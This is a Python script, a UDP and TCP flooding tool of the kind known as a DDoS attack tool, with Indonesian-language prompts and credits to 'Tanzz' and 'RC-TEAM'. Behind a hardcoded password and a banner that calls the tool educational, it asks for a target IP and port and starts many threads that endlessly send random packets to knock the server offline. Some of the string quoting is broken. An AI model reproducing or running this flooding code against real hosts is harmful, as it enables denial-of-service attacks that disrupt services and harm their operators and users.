#decode by ryhs
import random
import socket
import threading
import os
import sys
import time
from time import sleep

os.system("clear")
password ="Tanzz"

for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] TUNGGU 5 DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] PASSWORD SALAH!!! ")
		continue
time.sleep(5)
print("{} Selesai Menggunakan Password \033[92mRC-TEAM\033[0m ")
time.sleep(5)
os.system("clear")
print("\u001b[31m{} Baca Dulu Broo!")
print("""\u001b[31m
|              WARNING!!!!               |
|                                        |
|DDoS merupakan hal ilegal,perlu di ingat|
|tools ini bertujuan edukasi semata      |
|jika ada yang menyalahgunakannya        |
|jangan salahkan pihak kami selaku       |
|pembuat tools -RC-TEAM              |
time.sleep(5)
os.system("clear")
print(""
    TOOLS XR COMMUNITY || PLEASE DON'T ABUSE !!!


\033[0m 
                
                
                
                
               

\033[92m========= Punya Tanzz =========
>> Author : Tanzz
>>> Coded : Xr Community
>>>> Youtube : Tanzz
>>>>> Akun Discord : Mikee#5555 """)
ip = str(input("[•] IP TARGET: "))
port = int(input("[•] PORT: "))
choice = str(input("[•] GASKUEN? (ddos/n) : "))
times = int(input("[•] PAKET: "))
threads = int(input("[•] THREADS : "))
os.system("clear")
def ddos():
	data = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m  ATTACKING TO SERVER\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			print("\033[92m [!] SERVER DOWN BANG")

def ddos2():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ATTACKING TO SERVER\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] SERVER DOWN")

def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ATTACKING TO SERVER\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] SERVER DOWN")

for y in range(threads):
	if choice == 'ddos':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()
